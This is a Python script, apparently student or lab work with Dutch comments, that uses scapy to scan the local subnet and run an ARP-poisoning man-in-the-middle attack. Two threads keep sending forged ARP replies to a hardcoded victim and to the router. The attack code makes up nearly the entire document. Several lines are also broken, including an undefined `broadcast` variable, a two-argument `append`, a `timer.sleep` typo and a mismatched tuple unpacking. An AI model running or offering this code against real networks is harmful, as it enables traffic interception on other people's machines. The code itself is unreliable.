from scapy.all import ARP, send, Ether, srp, conf
import socket
import threading
import time

def arp_poison(target_ip, target_mac, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # 'op' specifiëert het type ARP boodschap, 'op=2' stuurt een ARP reply (ook zonder dat er een ARP request is geweest)
    while True: #pdst = protocol destinatian; hwdst = hardware destination; psrc = protocol source --> dit is het IP adres waarvan de data lijkt te komen voor de target
        send(packet, verbose=0) #dit verzend het 'poison packet' op het netwerk
        time.sleep(2)  # Repeat to keep ARP table poisoned

def get_local_ip_and_subnet():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    return local_ip

def get_ip_and_mac():
    local_ip = get_local_ip_and_subnet()
    subnet = '.'.join(local_ip.split('.')[:-1]) + '.1/24' #deze lijn bepaalt over welk netwerk we de scan willen doen; hier: het HELE ('.1/24') lokale netwerk waar we zelf op zitten (en dus eerst op zijn ingebroken)
    print("CP1")
    arp_request = ARP(pdst=subnet)  #dit scant voor target IP adressen
    ethernet_frame = Ether(dst='ff:ff:ff:ff:ff:ff') #maakt een ethernet frame met als destination het 'broadcast adress' (='ff:ff:ff:ff:ff:ff'), dit is een speciaal MAC adres waar ALLE devices op een netwerk naar luisteren
    packet = broadcast / arp_request #combineert het frame met de request
    print("CP2")
    answers_list = srp(packet, timeout=20, verbose=False)[0] #srp --> Send and Receive Packets
    result=[]
    print("CP3")
    print("IP\t\t\tMAc adress\n------------------------------------------")
    for element in answers_list: #loop over alle packets met antwoorden; 'element' is dan een lijst met eerst de verzonden info, dan de ontvangen antwoorden
        if element[1].psrc != local_ip:  # deze lijn zorgt ervoor dat de packets die van ons eigen device komen genegeerd worden (.psrc neemt het IP adress van waar de data komt)
            print(element[1].psrc + "\t\t" + element[1].hwsrc)
            result.append(element[1].psrc, element[1].hwsrc) #psrc = protocol source (= IP adres); hwsrc = hardware source (=MAC adres) (van de potentiële targets)
    print(result)
    if result != []:
        return result
    else:
        print("Failed, not connected")
        return None, None

# Settings for ARP poisoning
victim_ip = "192.168.1.100"  # IP address of the victim
victim_mac = "00:0c:29:68:22:51"  # MAC address of the victim (make sure to set this correctly)
router_ip, router_mac = get_ip_and_mac() #

try: #'try' zorgt ervoor dat dit onderbroken kan worden (met een KeyboardInterrupt)
    print("Starting ARP poisoning...")
    # Start poisoning threads
    threading.Thread(target=arp_poison, args=(victim_ip, victim_mac, router_ip)).start() #deze thread stuurt constant ARP packets naar de victim's device waarin staat dat het MAC adres van de attacker bij de IP van de router hoort
    threading.Thread(target=arp_poison, args=(router_ip, router_mac, victim_ip)).start() #deze thread stuurt constant ARP packets naar de router waarin staat dat het MAC adres van de attacker bij het IP adres van de victim hoort
    while True: #deze loop zorgt ervoor dat de threads blijven runnen op de achtergrond
        timer.sleep(10)
except KeyboardInterrupt:
    print("stopped by keyboard")

